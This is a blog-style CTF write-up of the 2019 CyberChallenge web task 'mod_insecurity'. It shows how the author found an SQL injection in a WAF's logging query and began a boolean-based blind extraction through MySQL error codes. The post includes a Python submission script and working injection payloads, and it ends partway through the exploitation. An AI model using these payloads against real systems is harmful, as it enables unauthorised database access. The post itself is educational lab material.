---
setup: |
  import Layout from '../../layouts/BlogPost.astro'
  import Picture from '../../components/Picture.astro'
title: Mod_insecurity ctf writeup - cyberchallenge 2019
publishDate: 2022-06-10
description: This is an old writeup for the web challenge mod_insecurity in the 2019 CyberChallenge ctf
---

This was one of the web challenges for the cyberchallenge ctf that took place in Italy in 2019.
I had a lot of fun solving it, and at the time i also drafted a writeup for it
but i never got around publishing it until now


## the challenge

> mod_insecurity 2.0 is a web application firewall (WAF) module fo the NGINX reverse proxy. It provides automatic SQLi protection using smart heuristics and the latest advancements in machine learning and blockchain technologies.
> modinsecurity.cyberchallenge.it

By visiting the link, we are presented with a simple 'SaaS landing page template', that repeats the same marketing pitch that was
in the challenge description. There is also a 'demo' section that says:

> Demo:
> You are already running it!
> Try to attack this page and see all your attempts fail!

And sure enough, at the end of the page there is a contact form. It's the only interactive
element on the website, so it's clear that we 
have to use it to perform some kind of sql injection

The form makes a POST request to the same origin, `modinsecurity.cyberchallenge.it`,
with a couple of parameters: username, email, phone, and message

## Looking for a vulnerability

After a couple of attempts with burp, i managed to trigger the waf by entering
`-- 'or 1=1` in one of the form fields


<Picture src="modinsecurity-waf" height={450} alt="A bright red web page showing an error message: Your request have been blocked! We detected an attept to attack this website.  mod_insecurity online protection™ blocked your request.  Your request have been logged. Logged requests: 17265 " />

<br/>


The challenge didn't provide any backend code, so it was time to formulate
an hypothesis on how the backend works.

I created a simple python script to automate the form submission, so that all the
tests could be easily documented and reproduced just by changing the `q` variable


```python
import requests

#this triggers the waf
q = " -- ' or 1=1"

url = 'http://modinsecurity.cyberchallenge.it/'
myobj = {
        'name': q,
        'email': "asd",
        'phone': "asdas",
        'message': "aasdasd"
        }
x = requests.post(url, data = myobj)
print(x.text)
```

### Hypothesis 1

```python
#this triggers the waf
q = " -- ' or 1=1"
# this is how the waf MIGHT work:
# a buggy blacklist of dangerous strings. When triggered, the error page is shown
# and the offending request is logged.
# the log query mighy look like this:
# replace ' with \' in $data (or something equally dumb that is not a prepared statement)
# insert into logs (data, time) values ($data, 123)

# testing hypothesis
...
#nope nothing works as expected
```

this first hypothesis failed, i couldn't get any result different than the
red waf page.

### Hypothesis 2

```python
#The backend could work as described in the first hypothesis, but 
# only specific form fields are logged when they are detected as dangerous
# INSERT INTO log '$query', 'asd'

# WORKS! this triggers the waf AND a real mysql error.
q="\\' -- ' or 1=1 "
#therefore the query cannot be
#INSERT INTO log 'asdasd', '$data'
#INSERT INTO log 'asdasd', '\\' -- ' or 1=1 '

#The idea now is to find a query at the sx of --
#that won't trigger an sql error
q="\\') -- ' or 1=1 "
#this doesn't throw an sql error, therefore the query is probably
#INSERT INTO logs (asd, asdsd) VALUES (213, '$ata')
#INSERT INTO logs (asd, asdsd) VALUES (213, '\\') -- ' or 1=1 ')

q="\\',12) -- ' or 1=1 "
#this payload confirms the hypothesis, since sql returns a new error code:
# 1136 (column count doesnt match value count)
# this fits the theory that the query is
#INSERT INTO logs (asd, asdsd) VALUES (213, '$ata')
#INSERT INTO logs (asd, asdsd) VALUES (213, '\\',12) -- ' or 1=1 ')
```

The second hypothesis instead turned out to be correct:

The waf has a blacklist of dangerous words, that is tested against each form input.
When an input matches the blacklist (it can be something as simple as ` --' or 1`)
The error page is returned, and the offending query is logged.
The logging process is the following:

- get the offending forminput data
- replace any `'` with `\'` in the data
- execute the sql query:

```sql
INSERT INTO logs (col1, col2) VALUES (timestampprobably, '$data')
```

where $data is replaced with the actual forminput data, without a prepared statement.
We have our sql injection.

> Fun fact, not really relevant: inserting a semicolumn in the query payload
> caused an interesting runtime error: 
>` bad result: failed to send query: cannot send query in the current context: 2: nil: nil.`
> A quick google search reveals the
>  [lua library](https://github.com/openresty/lua-resty-mysql/blob/master/lib/resty/mysql.lua)
>  used to write the challenge,
> and a quick glance at the [code](https://github.com/openresty/lua-resty-mysql/blob/908521368e95a302d06430ed1772e3fdd1e86216/lib/resty/mysql.lua#L1267) shows that the error cannot be exploited, it's just
> an issue with multi query statements. But it confirms that modinsecurity
> is indeed a nginx plugin

## Exploiting the sql injection

now that we have an sql injection, we need to exploit it. Unfortunately, the only
output that we can get from the backend is sql error codes, without any description.

After some considerations, i decided to try a boolean-based injection, using the
returned sql error codes:

```python
#this payload returns an error 1048: column can't be null
#only if the condition inside the if is true
a = "if(1=1, null, char(43))"
q= f"asd\\' LIKE {a} ) -- ' or 1=1 "

# An example in practice
a="(select CHAR(45) from information_schema.tables limit 70,1)"
q= f"asd\\' LIKE {a} ) -- ' or 1=1 "
#returns error 1048 if the query defined in 'a' didn't return any row
```
